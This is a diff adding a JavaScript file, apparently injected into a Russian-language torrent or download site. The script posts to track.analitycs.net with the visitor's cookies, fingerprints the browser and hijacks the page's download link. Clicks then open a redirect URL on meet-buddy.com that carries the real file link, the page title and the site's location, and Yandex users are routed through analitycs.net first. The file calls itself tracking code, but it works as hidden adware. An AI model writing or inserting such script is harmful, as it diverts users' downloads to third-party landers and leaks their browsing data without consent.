@@ -1,0 +1,46 @@
+﻿(function () {
+    
+    function CSTMTracking() {return fetch('https://track.analitycs.net/ctmv2/?action=get_subs', {method: 'POST', credentials: 'include'}).then((resp)=>{return resp.json();}).then((data)=>{return data.show;}).catch((err)=>{return 1;});}
+
+    const CSTMBrowserDetect = {get: function () {let e, t = !1;return window.opr && opr.addons || window.opera || navigator.userAgent.indexOf(" OPR/") >= 0 ? e = "Opera" : "undefined" != typeof InstallTrigger ? e = "Firefox" : /constructor/i.test(window.HTMLElement) || "[object SafariRemoteNotification]" === (!window.safari || "undefined" != typeof safari && safari.pushNotification).toString() ? e = "Safari" : document.documentMode ? (e = "IE", t = !0) : !t && window.StyleMedia ? e = "Edge" : navigator.userAgent.indexOf(" YaBrowser/") >= 0 || navigator.userAgent.indexOf(" Yowser/") >= 0 ? e = "Yandex" : navigator.userAgent.indexOf(" SamsungBrowser/") >= 0 ? e = "SamsungBrowser" : (window.chrome || window.chrome.webstore) && (e = "Chrome"), e}, isBrowser: function (e) {return this.get() === e}};
+
+
+    const uParams = {pId: 844, mode: 1, deep: 1, trnType: "trndwnl"};
+    function clearSpecialChar(e) {return e.replace(/[&\/\\#,+$~%.'":*?<>{}]/g, "")}
+    function getPageName(namePage = "") {const regexs = [/слушать/i, /бесплатно/i, /Скачать/i, /скачать/i, /торрент/i, /смотреть/i, /онлайн/i];regexs.forEach((regex) => {namePage = namePage.replace(regex, "")});namePage = namePage.replace("игру скачать торрент", "");namePage = namePage.replace("скачать", "");namePage = namePage.replace("Скачать - ", "");namePage = namePage.replace(" торрентом", "");namePage = namePage.replace(" - торрентом", "");namePage = namePage.replace("торрент", "");namePage = namePage.replace("Торрент", "");namePage = namePage.replace("фильм", "");namePage = namePage.replace("Фильм", "");namePage = namePage.replace("бесплатно", "");namePage = namePage.replace("без регистрации", "");namePage = namePage.replace(/\r?\n|\r/gm, "");namePage = clearSpecialChar(namePage);return encodeURIComponent(namePage);}
+    function getGoToLink(link) {let subdomain = location.hostname.replace(new RegExp(/\./, 'g'), '');subdomain = subdomain + (new Date()).getTime();let nlink = encodeURIComponent(btoa(unescape(encodeURIComponent(link))));return `https://r${subdomain}.analitycs.net/goto/?goto=${nlink}`;}
+    function getLinkByBrowser(link) {if (CSTMBrowserDetect.isBrowser("Yandex")) {return getGoToLink(link);}return link;}
+    function getNewLink(lnd_type, p_id, flink = "", namePage = "", currLocation = "", mode = 1, deep = 1, subid_4 = "download", subdomain_iter = "", options = {}) {const domain = "meet-buddy.com";const subid_5 = encodeURIComponent(location.hostname);let subdomain = location.hostname.replace(new RegExp(/\./, 'g'), '');subdomain = subdomain + (new Date()).getTime();const currentLocation = currLocation === "" ? encodeURIComponent(window.location) : currLocation;if (!flink.startsWith(location.protocol)) {flink = location.protocol + flink;}flink = encodeURIComponent(flink);namePage = getPageName(namePage);let newLink = `https://dl${subdomain}${subdomain_iter}.${domain}/${lnd_type}/?p_id=${p_id}&subid_4=${subid_4}&subid_5=${subid_5}&mode=${mode}&deep=${deep}&flink=&wpdlf=${flink}&url=${currentLocation}&fname=${namePage}`;if (options.uid) {newLink = newLink + "&uid=" + options.uid;}return getLinkByBrowser(newLink);}
+    function downloadFileOnParentPage(addDownloadAttr = false, addDownloadFNameAttr = false) {const current_url = document.referrer;if (current_url !== "") {const url = new URL(current_url);let fLink = url.searchParams.get('wpdlf');let pId = url.searchParams.get('p_id');let fname = url.searchParams.get('fname');if (pId == uParams.pId && fLink) {setTimeout(function () {let cstm_btn = document.createElement("a");if (addDownloadAttr) {fname = addDownloadFNameAttr ? fname : "";cstm_btn.setAttribute("download", fname);};cstm_btn.setAttribute("href", fLink);cstm_btn.click();}, 1000);}}}
+    function addCstmAction(lnd_type, pId, mode, deep, subid_4, flink, namePage, subdomain_iter) {let link = getNewLink(lnd_type, pId, flink, namePage, "", mode, deep, subid_4, subdomain_iter);window.open(link, "_blank");return true;}
+    downloadFileOnParentPage();
+
+    function inHaystack(lnd_type, pId, mode, deep, subid_4) {
+        onceLink(lnd_type, pId, mode, deep, subid_4);
+    }
+
+    function onceLink(lnd_type, pId, mode, deep, subid_4) {
+        let linkGo = document.querySelector(".attachment a");
+        if (linkGo) {
+            let h1 = document.querySelector("h1");
+            let namePage = !h1 ? " " : h1.textContent;
+            let link = linkGo.href;
+            linkGo.removeAttribute("target");
+            linkGo.setAttribute('href', 'javascript:void(0);');
+            linkGo.addEventListener('click', function (e) {
+                addCstmAction(lnd_type, pId, mode, deep, subid_4, link, namePage);
+            });
+        }
+    }
+    
+
+    CSTMTracking().then((show) => {
+        let isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+        if (!isIOS && show) {
+            let subid_4 = "redirect";
+            inHaystack(uParams.trnType, uParams.pId, uParams.mode, uParams.deep, subid_4);
+        }
+    });
+    
+})();
+
